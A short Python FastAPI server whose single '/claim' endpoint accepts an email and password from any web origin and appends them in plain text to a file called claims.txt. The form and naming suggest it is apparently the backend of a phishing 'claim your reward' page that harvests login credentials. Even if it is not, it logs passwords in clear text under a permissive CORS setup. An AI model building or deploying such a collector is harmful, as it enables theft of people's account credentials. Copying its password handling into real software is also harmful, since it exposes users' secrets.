from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from datetime import datetime

app = FastAPI()

# Allow CORS for frontend testing
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # In production, set specific domain
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class ClaimData(BaseModel):
    email: str
    password: str

@app.post("/claim")
async def receive_claim(data: ClaimData):
    with open("claims.txt", "a") as file:
        file.write(f"{datetime.now()} - Email: {data.email}, Password: {data.password}\n")
    return {"message": "Claim received"}
